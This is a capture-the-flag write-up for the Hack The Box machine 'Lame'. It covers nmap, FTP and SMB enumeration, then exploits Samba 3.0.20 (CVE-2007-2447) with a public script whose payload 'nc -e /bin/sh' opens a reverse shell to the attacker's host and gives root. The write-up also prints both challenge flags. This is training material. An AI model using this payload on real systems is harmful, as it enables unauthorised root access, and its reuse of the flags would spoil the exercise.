---
title: "Lame from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Lame from HTB
		[page](https://app.hackthebox.com/machines/Lame)
First do the `nmap`scan:
```bash
$ nmap -sCV --min-rate 4000 -Pn 10.10.10.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-02 22:57 +04
Nmap scan report for 10.10.10.3
Host is up (0.26s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.16.47
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m24s, deviation: 2h49m46s, median: 21s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-08-02T14:58:40-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.06 seconds
```
As you see there is `FTP`port open and It's accessible with anonymous, but there is nothing on `FTP`:
```bash
$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:giorgi): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||22305|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> pwd
Remote directory: /
ftp> ls -la
229 Entering Extended Passive Mode (|||61662|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
```
There is no exploits on `vsftpd 2.3.4`to do something to `FTP`.
Next is `SMB`, Lets connect to it:
```bash
$ smbmap -H 10.10.10.3

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                    https://github.com/ShawnDEvans/smbmap
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.10.10.3:445  Name: 10.10.10.3                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
[*] Closed 1 connections
```
Next connect to `SMBclient`itself:
```bash
$ smbclient -N \\\\10.10.10.3\\tmp
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup
blocksize      cancel         case_sensitive cd             chmod
chown          close          del            deltree        dir
du             echo           exit           get            getfacl
geteas         hardlink       help           history        iosize
lcd            link           lock           lowercase      ls
l              mask           md             mget           mkdir
mkfifo         more           mput           newer          notify
open           posix          posix_encrypt  posix_open     posix_mkdir
posix_rmdir    posix_unlink   posix_whoami   print          prompt
put            pwd            q              queue          quit
readlink       rd             recurse        reget          rename
reput          rm             rmdir          showacls       setea
setmode        scopy          stat           symlink        tar
tarmode        timeout        translate      unlock         volume
vuid           wdel           logon          listconnect    showconnect
tcon           tdis           tid            utimes         logoff
..             !
smb: \> ls
  .                                   D        0  Fri Aug  2 23:15:20 2024
  ..                                 DR        0  Sat Oct 31 10:33:58 2020
  .ICE-unix                          DH        0  Fri Aug  2 21:19:43 2024
  5571.jsvc_up                        R        0  Fri Aug  2 21:20:45 2024
  vmware-root                        DR        0  Fri Aug  2 21:19:54 2024
  .X11-unix                          DH        0  Fri Aug  2 21:20:09 2024
  .X0-lock                           HR       11  Fri Aug  2 21:20:09 2024
  vgauthsvclog.txt.0                  R     1600  Fri Aug  2 21:19:41 2024
                7282168 blocks of size 1024. 5386428 blocks available
smb: \> exit
```
I found nothing and tried to find exploit on ` Samba smbd 3.0.20`and found this [github repository](https://github.com/Ziemni/CVE-2007-2447-in-Python/tree/master). I downloaded the script and ran This:
```bash
$nc -nlvp 1234 #(in other terminal)
$ python3 smbExploit.py 10.10.10.3 139 'nc -e /bin/sh 10.10.16.47 1234'
[*] Sending the payload
[*] Something went wrong
ERROR:
```
I got the connection and then proceeded:
```bash
$ nc -nlvp 1234
listening on [any] 1234 ...
ncconnect to [10.10.16.47] from (UNKNOWN) [10.10.10.3] 32826
  ls
  whoami
root
  pwd
/
  cd root
  ls -la
total 80
drwxr-xr-x 13 root root 4096 Aug  2 13:20 .
drwxr-xr-x 21 root root 4096 Oct 31  2020 ..
-rw-------  1 root root  373 Aug  2 13:20 .Xauthority
lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
-rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
drwx------  3 root root 4096 May 20  2012 .config
drwx------  2 root root 4096 May 20  2012 .filezilla
drwxr-xr-x  5 root root 4096 Aug  2 13:20 .fluxbox
drwx------  2 root root 4096 May 20  2012 .gconf
drwx------  2 root root 4096 May 20  2012 .gconfd
drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
drwx------  4 root root 4096 May 20  2012 .mozilla
-rw-r--r--  1 root root  141 Oct 20  2007 .profile
drwx------  5 root root 4096 May 20  2012 .purple
-rwx------  1 root root    4 May 20  2012 .rhosts
drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
drwx------  2 root root 4096 Aug  2 13:20 .vnc
drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
-rwx------  1 root root  401 May 20  2012 reset_logs.sh
-rw-------  1 root root   33 Aug  2 13:19 root.txt
-rw-r--r--  1 root root  118 Aug  2 13:20 vnc.log
   cat root.txt
0c7a1edf58797d5b51d882647124ae1b
   cd ..
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
   cd home
   ls
ftp
makis
service
user
  cd makis
  ls
user.txt
cat user.txt
47c1bb3b953857502526a5afa78dff5c
```
And that's the flags:
**User.txt --- 47c1bb3b953857502526a5afa78dff5c**
**Root.txt --- 0c7a1edf58797d5b51d882647124ae1b**
![](/assets/images/Screenshot from 2024-08-02 23-32-52.png)
